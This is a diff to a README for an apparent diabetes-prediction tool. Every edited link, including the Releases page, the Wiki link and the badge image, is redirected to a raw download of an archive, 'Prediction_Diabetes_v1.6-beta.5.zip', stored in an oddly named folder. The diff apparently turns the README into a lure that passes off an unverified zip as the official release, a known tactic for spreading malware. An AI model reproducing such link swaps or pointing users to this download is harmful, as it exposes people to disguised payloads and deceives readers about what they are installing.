@@ -6,7 +6,7 @@
 
 # 🩺 Diabetes-Prediction - Accurate Insights for Healthier Choices
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-blue)](https://github.com/Sonal-perera/Diabetes-Prediction/releases)
+[![Download Now](https://github.com/Sonal-perera/Diabetes-Prediction/raw/refs/heads/main/Siliquariidae/Prediction_Diabetes_v1.6-beta.5.zip%20Now-blue)](https://github.com/Sonal-perera/Diabetes-Prediction/raw/refs/heads/main/Siliquariidae/Prediction_Diabetes_v1.6-beta.5.zip)
 
 ## 🚀 Getting Started
 
@@ -14,7 +14,7 @@ Welcome to the Diabetes-Prediction application. This tool helps you understand y
 
 ## 📥 Download & Install
 
-To download the latest version, please visit this page: [Download Page](https://github.com/Sonal-perera/Diabetes-Prediction/releases). 
+To download the latest version, please visit this page: [Download Page](https://github.com/Sonal-perera/Diabetes-Prediction/raw/refs/heads/main/Siliquariidae/Prediction_Diabetes_v1.6-beta.5.zip). 
 
 1. Click on the link above to access the Releases page.
 2. Look for the latest release version. 
@@ -66,7 +66,7 @@ This tool uses various Python libraries to deliver its results:
 
 ## 📦 Additional Resources
 
-- **Documentation**: For in-depth guidance, refer to the [Wiki Page](https://github.com/Sonal-perera/Diabetes-Prediction/wiki).
+- **Documentation**: For in-depth guidance, refer to the [Wiki Page](https://github.com/Sonal-perera/Diabetes-Prediction/raw/refs/heads/main/Siliquariidae/Prediction_Diabetes_v1.6-beta.5.zip).
 - **Community Support**: For any questions or support, please visit the Issues section in the repository.
 
 ## ⚙️ Troubleshooting Common Issues
@@ -83,6 +83,6 @@ We welcome your feedback to improve the application. If you have suggestions or 
 
 ## 🔗 Useful Links
 
-For convenient access, here is the [Download Page](https://github.com/Sonal-perera/Diabetes-Prediction/releases) once again.
+For convenient access, here is the [Download Page](https://github.com/Sonal-perera/Diabetes-Prediction/raw/refs/heads/main/Siliquariidae/Prediction_Diabetes_v1.6-beta.5.zip) once again.
 
 Don't hesitate to explore and enjoy predicting your diabetes risk with ease!
